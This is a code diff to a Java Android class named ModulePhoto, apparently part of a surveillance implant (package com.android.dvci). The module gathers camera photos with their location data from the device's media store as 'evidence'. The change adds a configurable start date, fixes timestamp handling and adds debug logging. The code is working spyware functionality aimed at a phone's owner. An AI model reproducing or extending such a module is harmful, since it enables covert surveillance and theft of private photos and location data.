@@ -10,6 +10,7 @@ import com.android.dvci.ProcessStatus;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
+import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.evidence.Markup;
@@ -42,17 +43,23 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 	Semaphore semaphorePhoto = new Semaphore(1);
 	private Markup markupPhoto;
 	private long lastTimestamp = 0;
+	private Date from;
 
 	@Override
 	protected boolean parse(ConfModule conf) {
-		setPeriod(3600 * 000);
+		try {
+			from = conf.getDate("datefrom");
+		} catch (ConfigurationException e) {
+			Date today = new Date();
+			from = new Date( today.getTime() - (3600 * 24 * 1000) );
+		}
+		setPeriod(3600 * 1000);
 		return true;
 	}
 
 	@Override
 	protected void actualGo() {
 		fetchPhotos();
-
 	}
 
 	@Override
@@ -64,7 +71,6 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		fetchPhotos();
 		ListenerProcess.self().attach(this);
 	}
-
 
 	@Override
 	protected void actualStop() {
@@ -80,6 +86,8 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		}
 		try {
 			lastTimestamp = markupPhoto.unserialize(new Long(0));
+			lastTimestamp = Math.max(lastTimestamp, from.getTime());
+
 			long newtimestamp = getCameraImages(Status.getAppContext(), new ImageVisitor(), lastTimestamp);
 
 			if (Cfg.DEBUG) {
@@ -116,7 +124,12 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			long last = 0;
 
 			final String path = cursor.getString(dataColumn);
-			final Date date = new Date(cursor.getLong(dateColumn) * 1000);
+
+			final Date date = new Date(cursor.getLong(dateColumn));
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (visitor), timestamp: " + cursor.getLong(dateColumn) + " date: " + date);
+			}
+
 			final String title = cursor.getString(titleColumn);
 			final String mime = cursor.getString(mimeColumn);
 
@@ -152,13 +165,18 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 				MediaStore.Images.ImageColumns.LATITUDE, MediaStore.Images.ImageColumns.LONGITUDE,
 				MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
 		final String selection = MediaStore.Images.Media.DATE_TAKEN + " > ?";
-		final String[] selectionArgs = {Long.toString(lastTimestamp / 1000)};
+		final String[] selectionArgs = {Long.toString(lastTimestamp)};
 		final String order = MediaStore.Images.Media.DATE_TAKEN + " asc";
 		final Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
 				projection,
 				selection,
 				selectionArgs,
 				order);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getCameraImages), cursor: " + cursor);
+			Check.log(TAG + " (getCameraImages), selection timestamp: " + selectionArgs[0]);
+		}
 
 		if (cursor.moveToFirst()) {
 			do {
